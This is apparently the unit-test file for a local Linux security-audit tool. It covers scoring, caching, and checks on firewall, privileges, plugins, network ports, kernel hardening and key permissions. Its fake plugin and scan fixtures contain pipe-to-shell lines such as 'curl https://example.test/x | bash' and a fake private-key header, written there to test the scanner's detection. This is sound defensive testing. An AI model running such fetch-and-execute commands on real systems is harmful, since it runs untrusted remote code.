#!/usr/bin/env python3
"""Runner, contract, cache, and defect-fix tests. No root; fake files only."""

from __future__ import annotations

import io
import json
import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from subprocess import CompletedProcess
from unittest.mock import patch

SCRIPTS = Path(__file__).resolve().parents[1]
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import audit  # noqa: E402
from checks import make_result, run_cmd  # noqa: E402
from checks.cache import read_cached, write_cached  # noqa: E402
from checks.desktop import check_desktop_lock, parse_hypridle_listeners  # noqa: E402
from checks.firewall import check_firewall  # noqa: E402
from checks.kernel import check_kernel_hardening  # noqa: E402
from checks.keys import check_ssh_gpg_perms  # noqa: E402
from checks.network import check_network_ports  # noqa: E402
from checks.plugins import check_plugins_deep  # noqa: E402
from checks.privileges import check_privileges_and_path  # noqa: E402
from checks.static_scan import DEFAULT_RULES, scan_tree  # noqa: E402

TOP_LEVEL_KEYS = {
    "schemaVersion", "tool", "version", "hostname", "timestamp",
    "timestampDisplay", "score", "grade", "statusLabel", "statusColor",
    "failedCount", "naCount", "totalChecks", "audits", "errors", "baselineDiff",
}


def _fn(cid, **kwargs):
    raise_exc = kwargs.pop("raise_exc", None)
    lane = kwargs.pop("lane", "fast")
    category = kwargs.get("category", "Test")
    title = kwargs.get("title", cid)
    max_score = kwargs.get("max_score", 10)

    def inner():
        if raise_exc:
            raise raise_exc
        payload = {
            "id": cid,
            "category": category,
            "title": title,
            "description": kwargs.get("description", "ok"),
            "max_score": max_score,
            "score": kwargs.get("score", max_score if kwargs.get("passed", True) else 0),
            "passed": kwargs.get("passed", True),
            "applicable": kwargs.get("applicable", True),
            "lane": lane,
        }
        if "severity" in kwargs:
            payload["severity"] = kwargs["severity"]
        return make_result(**payload)

    inner.check_id = cid
    inner.category = category
    inner.title = title
    inner.max_score = max_score
    inner.lane = lane
    return inner


def _run_inactive(argv, timeout=1.0):
    if os.path.basename(str(argv[0])) == "sudo":
        raise AssertionError("sudo must not be invoked")
    if argv[:2] == ["systemctl", "is-active"]:
        return CompletedProcess(argv, 3, stdout="inactive\n", stderr="")
    return CompletedProcess(argv, 127, stdout="", stderr="missing")


def _run_active(service):
    def run(argv, timeout=1.0):
        if os.path.basename(str(argv[0])) == "sudo":
            raise AssertionError("sudo must not be invoked")
        if argv[:3] == ["systemctl", "is-active", service]:
            return CompletedProcess(argv, 0, stdout="active\n", stderr="")
        if argv[:2] == ["systemctl", "is-active"]:
            return CompletedProcess(argv, 3, stdout="inactive\n", stderr="")
        return CompletedProcess(argv, 127, stdout="", stderr="missing")

    return run


def _capture_main(argv, **kwargs):
    buf = io.StringIO()
    with patch("sys.stdout", buf):
        code = audit.main(argv, **kwargs)
    return code, buf.getvalue()


class ScoringTests(unittest.TestCase):
    def test_na_excluded_from_score(self):
        audits = [
            make_result(
                id="a", category="T", title="A", description="d",
                score=10, max_score=10, passed=True, applicable=True,
            ),
            make_result(
                id="b", category="T", title="B", description="d",
                score=0, max_score=20, passed=False, applicable=False,
            ),
        ]
        self.assertEqual(audit.compute_score(audits), 100)

    def test_partial_score_rounded(self):
        audits = [
            make_result(id="a", category="T", title="A", description="d", score=10, max_score=10),
            make_result(id="b", category="T", title="B", description="d", score=0, max_score=10, passed=False, severity="high"),
        ]
        self.assertEqual(audit.compute_score(audits), 50)

    def test_raising_check_lands_in_errors(self):
        boom = _fn("boom", raise_exc=RuntimeError("nope"), max_score=10)
        ok = _fn("ok", score=5, max_score=5)
        audits, errors = audit.collect_results(fast_checks=[ok, boom], slow_checks=[])
        self.assertEqual(len(errors), 1)
        self.assertEqual(errors[0]["id"], "boom")
        self.assertIn("nope", errors[0]["error"])
        boom_result = next(a for a in audits if a["id"] == "boom")
        self.assertFalse(boom_result["applicable"])
        self.assertFalse(boom_result["passed"])
        self.assertEqual(audit.compute_score(audits), 100)
        self.assertEqual(boom_result["severity"], "info")

    def test_only_and_skip(self):
        a = _fn("a")
        b = _fn("b")
        c = _fn("c")
        audits, _ = audit.collect_results(
            only=["a", "c"], skip=["c"], fast_checks=[a, b, c], slow_checks=[]
        )
        self.assertEqual([x["id"] for x in audits], ["a"])

    def test_baseline_diff(self):
        current = [
            make_result(id="x", category="T", title="X", description="d", passed=False, score=0, max_score=10, severity="high"),
            make_result(id="y", category="T", title="Y", description="d", passed=True, score=10, max_score=10),
        ]
        previous = {
            "score": 50,
            "audits": [
                {"id": "x", "passed": True, "applicable": True},
                {"id": "y", "passed": False, "applicable": True},
            ],
        }
        diff = audit.build_baseline_diff(current, previous, 50)
        self.assertEqual(diff["regressed"], ["x"])
        self.assertEqual(diff["improved"], ["y"])
        self.assertEqual(diff["scoreDelta"], 0)

    def test_strict_exit_codes(self):
        ok = _fn("ok", score=10, max_score=10)
        bad = _fn("bad", passed=False, score=0, max_score=10, severity="high")
        boom = _fn("boom", raise_exc=RuntimeError("x"))

        code, _ = _capture_main(["--strict"], fast_checks=[ok], slow_checks=[])
        self.assertEqual(code, 0)

        code, _ = _capture_main(["--strict"], fast_checks=[bad], slow_checks=[])
        self.assertEqual(code, 1)

        code, _ = _capture_main(["--strict"], fast_checks=[boom], slow_checks=[])
        self.assertEqual(code, 2)

        prev = {
            "score": 100,
            "audits": [{"id": "ok", "passed": True, "applicable": True}],
        }
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as handle:
            json.dump(prev, handle)
            path = handle.name
        try:
            code, out = _capture_main(
                ["--strict", "--baseline", path],
                fast_checks=[_fn("ok", passed=False, score=0, max_score=10, severity="medium")],
                slow_checks=[],
            )
        finally:
            os.unlink(path)
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertEqual(data["baselineDiff"]["regressed"], ["ok"])

    def test_default_exit_zero_even_on_failures(self):
        code, out = _capture_main(
            [],
            fast_checks=[_fn("bad", passed=False, score=0, max_score=10, severity="high")],
            slow_checks=[],
        )
        self.assertEqual(code, 0)
        data = json.loads(out)
        self.assertEqual(set(data), TOP_LEVEL_KEYS)
        self.assertEqual(data["schemaVersion"], 2)
        self.assertEqual(data["tool"], "omasecurity")
        self.assertIsNone(data["baselineDiff"])

    def test_passing_severity_is_info(self):
        result = make_result(
            id="x", category="T", title="X", description="d",
            passed=True, score=10, max_score=10, severity="high",
        )
        self.assertEqual(result["severity"], "info")
        na = make_result(
            id="y", category="T", title="Y", description="d",
            passed=False, applicable=False, score=0, max_score=10, severity="critical",
        )
        self.assertEqual(na["severity"], "info")


class CacheTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.old = os.environ.get("XDG_CACHE_HOME")
        os.environ["XDG_CACHE_HOME"] = self.tmp.name

    def tearDown(self):
        if self.old is None:
            os.environ.pop("XDG_CACHE_HOME", None)
        else:
            os.environ["XDG_CACHE_HOME"] = self.old
        self.tmp.cleanup()

    def test_cache_freshness_and_mode(self):
        stored = make_result(
            id="slow_demo", category="T", title="Slow", description="done",
            score=4, max_score=4, lane="slow",
        )
        path = write_cached("slow_demo", stored)
        self.assertEqual(path.stat().st_mode & 0o777, 0o600)
        fresh = read_cached("slow_demo", max_age_s=7200)
        self.assertIsNotNone(fresh)
        self.assertTrue(fresh["cached"])
        self.assertIn("cachedAt", fresh)

        payload = json.loads(path.read_text())
        payload["written_at"] = (datetime.now(timezone.utc) - timedelta(hours=3)).isoformat()
        path.write_text(json.dumps(payload))
        self.assertIsNone(read_cached("slow_demo", max_age_s=7200))

    def test_pending_when_cache_missing(self):
        slow = _fn("slow_demo", lane="slow", score=4, max_score=4)
        audits, _ = audit.collect_results(
            run_slow=False, use_cache=True, fast_checks=[], slow_checks=[slow]
        )
        self.assertTrue(audits[0].get("pending"))
        self.assertFalse(audits[0]["applicable"])
        self.assertIn("Not collected yet", audits[0]["description"])

    def test_slow_run_writes_cache_and_fast_serves_it(self):
        slow = _fn("slow_demo", lane="slow", score=4, max_score=4)
        audit.collect_results(run_slow=True, fast_checks=[], slow_checks=[slow])
        audits, _ = audit.collect_results(
            run_slow=False, use_cache=True, fast_checks=[], slow_checks=[slow]
        )
        self.assertTrue(audits[0].get("cached"))
        self.assertTrue(audits[0]["passed"])
        self.assertEqual(audits[0]["lane"], "slow")


class DefectFixTests(unittest.TestCase):
    def test_defect_firewall_no_sudo_and_ufw_conf(self):
        with self.assertRaises(ValueError):
            run_cmd(["sudo", "-n", "ufw", "status"])

        with tempfile.TemporaryDirectory() as tmp:
            conf = Path(tmp) / "ufw.conf"
            conf.write_text("# comment\nENABLED=yes\n")
            result = check_firewall(ufw_conf=conf, run=_run_inactive)
            self.assertTrue(result["passed"])
            self.assertEqual(result["score"], 15)
            self.assertTrue(any("ENABLED=yes" in line for line in result["details"]))

        active = check_firewall(ufw_conf=Path("/no/such/ufw.conf"), run=_run_active("nftables"))
        self.assertTrue(active["passed"])
        self.assertIn("nftables", active["description"])

    def test_defect_privileges_no_sudo(self):
        with patch("subprocess.run") as mocked:
            clean = check_privileges_and_path(path_value="/usr/bin:/usr/sbin")
            mocked.assert_not_called()
        self.assertTrue(clean["passed"])
        self.assertTrue(any("sudo -l | grep NOPASSWD" in line for line in clean["details"]))
        self.assertEqual(clean["max_score"], 8)
        self.assertEqual(clean["score"], 8)

        dirty = check_privileges_and_path(path_value=".:/usr/bin")
        self.assertFalse(dirty["passed"])
        self.assertIn("PATH", dirty["description"])

    def test_defect_desktop_hypridle_listeners(self):
        with tempfile.TemporaryDirectory() as tmp:
            hypr = Path(tmp) / "hypridle.conf"
            hypr.write_text(
                "\n".join([
                    "general {",
                    "    lock_cmd = pidof hyprlock || hyprlock",
                    "}",
                    "listener {",
                    "    timeout = 300",
                    "    on-timeout = hyprctl dispatch dpms off",
                    "}",
                    "listener {",
                    "    timeout = 150",
                    "    on-timeout = loginctl lock-session",
                    "}",
                    "",
                ])
            )
            listeners = parse_hypridle_listeners(hypr.read_text())
            self.assertEqual(len(listeners), 2)
            result = check_desktop_lock(hypridle_path=hypr, shell_json_path=Path(tmp) / "missing.json")
            self.assertTrue(result["passed"])
            self.assertIn("150s", result["description"])
            self.assertTrue(any("150s" in line for line in result["details"]))

            shell = Path(tmp) / "shell.json"
            shell.write_text(json.dumps({"idle": {"lock": 90}}))
            empty_hypr = Path(tmp) / "empty.conf"
            empty_hypr.write_text("listener {\n    timeout = 0\n    on-timeout = hyprlock\n}\n")
            via_shell = check_desktop_lock(hypridle_path=empty_hypr, shell_json_path=shell)
            self.assertTrue(via_shell["passed"])
            self.assertIn("90s", via_shell["description"])

            missing = check_desktop_lock(
                hypridle_path=Path(tmp) / "nope.conf",
                shell_json_path=Path(tmp) / "nope.json",
            )
            self.assertFalse(missing["applicable"])

    def test_defect_plugins_self_dir_exclusion(self):
        with tempfile.TemporaryDirectory() as tmp:
            plugins = Path(tmp) / "plugins"
            self_dir = plugins / "omasecurity"
            other = plugins / "otherplug"
            self_dir.mkdir(parents=True)
            other.mkdir()
            (self_dir / "evil.sh").write_text("curl https://example.test/x | bash\n")
            (other / "ok.sh").write_text("echo ok\n")
            result = check_plugins_deep(plugins_dir=plugins, self_dir=self_dir)
            self.assertTrue(result["applicable"])
            self.assertTrue(result["passed"])
            self.assertEqual(result["flagged_items"], [])
            self.assertIn("1 plugins scanned", result["details"])
            self.assertIn("1 files scanned", result["details"])

            only_self = check_plugins_deep(plugins_dir=plugins, self_dir=self_dir)
            # still has otherplug
            self.assertTrue(only_self["applicable"])

            flagged_dir = plugins / "bad"
            flagged_dir.mkdir()
            (flagged_dir / "x.sh").write_text("sudo pacman -Syu\n")
            flagged = check_plugins_deep(plugins_dir=plugins, self_dir=self_dir)
            self.assertFalse(flagged["passed"])
            self.assertTrue(any(item["plugin"] == "bad" for item in flagged["flagged_items"]))
            self.assertFalse(any("omasecurity" in item["file"] for item in flagged["flagged_items"]))

    def test_plugins_exclude_by_manifest_id(self):
        with tempfile.TemporaryDirectory() as tmp:
            checkout = Path(tmp) / "checkout"
            checkout.mkdir()
            (checkout / "manifest.json").write_text(json.dumps({"id": "ucmz851.omasecurity"}))
            plugins = Path(tmp) / "plugins"
            installed = plugins / "ucmz851.omasecurity"
            installed.mkdir(parents=True)
            (installed / "manifest.json").write_text(json.dumps({"id": "ucmz851.omasecurity"}))
            (installed / "evil.sh").write_text("curl https://example.test/x | bash\n")
            other = plugins / "otherplug"
            other.mkdir()
            (other / "manifest.json").write_text(json.dumps({"id": "someone.else"}))
            (other / "ok.sh").write_text("echo ok\n")
            result = check_plugins_deep(plugins_dir=plugins, self_dir=checkout)
            self.assertTrue(result["applicable"])
            self.assertTrue(result["passed"])
            self.assertEqual(result["flagged_items"], [])
            self.assertFalse(any(item["plugin"] == "ucmz851.omasecurity" for item in result["flagged_items"]))
            self.assertIn("1 plugins scanned", result["details"])

            (other / "bad.sh").write_text("sudo true\n")
            flagged = check_plugins_deep(plugins_dir=plugins, self_dir=checkout)
            self.assertFalse(flagged["passed"])
            self.assertTrue(any(item["plugin"] == "otherplug" for item in flagged["flagged_items"]))
            self.assertFalse(any(item["plugin"] == "ucmz851.omasecurity" for item in flagged["flagged_items"]))

    def test_defect_network_tcp_only_penalty(self):
        tcp = "\n".join([
            "LISTEN 0 128 0.0.0.0:22 0.0.0.0:*",
            "LISTEN 0 128 127.0.0.1:8080 0.0.0.0:*",
            "",
        ])
        udp = "UNCONN 0 0 0.0.0.0:5353 0.0.0.0:*\n"

        def run(argv, timeout=1.0):
            if argv[:2] == ["ss", "-tlnH"]:
                return CompletedProcess(argv, 0, stdout=tcp, stderr="")
            if argv[:2] == ["ss", "-ulnH"]:
                return CompletedProcess(argv, 0, stdout=udp, stderr="")
            return CompletedProcess(argv, 127, stdout="", stderr="")

        with tempfile.TemporaryDirectory() as tmp:
            sshd = Path(tmp) / "sshd_config"
            sshd.write_text("PermitRootLogin prohibit-password\n")
            result = check_network_ports(sshd_config=sshd, run=run)
        self.assertTrue(result["passed"])
        self.assertEqual(result["score"], 5)
        self.assertTrue(any("5353" in line for line in result["details"]))
        self.assertTrue(any("22" in line for line in result["details"]))

        many_tcp = "\n".join(
            f"LISTEN 0 128 0.0.0.0:{port} 0.0.0.0:*" for port in range(20, 28)
        ) + "\n"

        def run_many(argv, timeout=1.0):
            if argv[:2] == ["ss", "-tlnH"]:
                return CompletedProcess(argv, 0, stdout=many_tcp, stderr="")
            if argv[:2] == ["ss", "-ulnH"]:
                return CompletedProcess(argv, 0, stdout="", stderr="")
            return CompletedProcess(argv, 127, stdout="", stderr="")

        many = check_network_ports(sshd_config=Path("/no/sshd"), run=run_many)
        self.assertFalse(many["passed"])
        self.assertEqual(many["score"], 3)

    def test_defect_kernel_mitigations_and_vulns(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ptrace").write_text("1\n")
            (root / "dmesg").write_text("1\n")
            (root / "kptr").write_text("1\n")
            (root / "cmdline").write_text("root=/dev/vda mitigations=off quiet\n")
            vulns = root / "vulns"
            vulns.mkdir()
            (vulns / "spectre_v2").write_text("Vulnerable: retpoline not applied\n")
            (vulns / "meltdown").write_text("Not affected\n")
            result = check_kernel_hardening(
                ptrace_path=root / "ptrace",
                dmesg_path=root / "dmesg",
                kptr_path=root / "kptr",
                cmdline_path=root / "cmdline",
                vulns_dir=vulns,
            )
            self.assertFalse(result["passed"])
            self.assertEqual(result["score"], 10)  # 15 - 3 - 2
            self.assertIn("mitigations=off", result["description"])
            self.assertTrue(any("spectre_v2" in line for line in result["details"]))
            self.assertFalse(any("retpoline" in line for line in result["details"]))
            self.assertEqual(result["max_score"], 15)

            missing = check_kernel_hardening(
                ptrace_path=root / "missing1",
                dmesg_path=root / "missing2",
                kptr_path=root / "missing3",
                cmdline_path=root / "missing4",
                vulns_dir=root / "missing5",
            )
            self.assertFalse(missing["applicable"])


class StaticScanAndKeysTests(unittest.TestCase):
    def test_obfuscated_exec_ignores_run_eval(self):
        rule = next(item for item in DEFAULT_RULES if item["id"] == "obfuscated_exec")
        self.assertIsNone(rule["regex"].search("output = run_eval(x)"))
        self.assertIsNotNone(rule["regex"].search("eval(x)"))
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "safe.py").write_text("output = run_eval(x)\n")
            (root / "bad.py").write_text("eval(x)\n")
            flagged, _ = scan_tree(
                root, [".py"], DEFAULT_RULES, 50, 1024 * 1024, follow_symlinks=False
            )
            files = {item["file"] for item in flagged if item.get("rule_id") == "obfuscated_exec"}
            self.assertNotIn("safe.py", files)
            self.assertIn("bad.py", files)

    def test_scan_tree_skips_tests_and_redacts_secrets(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.sh").write_text("echo hi\n")
            tests = root / "tests"
            tests.mkdir()
            (tests / "evil.sh").write_text("curl https://x | bash\n")
            (root / "key.py").write_text("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n")
            flagged, scanned = scan_tree(
                root, [".sh", ".py"], DEFAULT_RULES, 50, 1024 * 1024, follow_symlinks=False
            )
            self.assertTrue(scanned >= 1)
            self.assertFalse(any("tests/" in item["file"] for item in flagged))
            secrets = [item for item in flagged if item.get("rule_id") == "private_key"]
            self.assertTrue(secrets)
            self.assertEqual(secrets[0]["snippet"], "[redacted]")

    def test_keys_na_and_modes(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            na = check_ssh_gpg_perms(home=home)
            self.assertFalse(na["applicable"])
            ssh = home / ".ssh"
            ssh.mkdir()
            os.chmod(ssh, 0o700)
            key = ssh / "id_ed25519"
            key.write_text("not-a-real-key\n")
            os.chmod(key, 0o644)
            result = check_ssh_gpg_perms(home=home)
            self.assertTrue(result["applicable"])
            self.assertFalse(result["passed"])
            self.assertIn("id_ed25519", result["description"])
            self.assertNotIn("not-a-real-key", json.dumps(result))


class ListAndTextTests(unittest.TestCase):
    def test_list_and_text_format(self):
        checks = [_fn("demo", category="Network", max_score=15)]
        code, out = _capture_main(["--list"], fast_checks=checks, slow_checks=[])
        self.assertEqual(code, 0)
        self.assertIn("demo", out)
        self.assertIn("Network", out)
        self.assertIn("fast", out)
        code, out = _capture_main(["--format", "text"], fast_checks=checks, slow_checks=[])
        self.assertEqual(code, 0)
        self.assertIn("PASS", out)
        self.assertIn("demo", out)


if __name__ == "__main__":
    unittest.main()
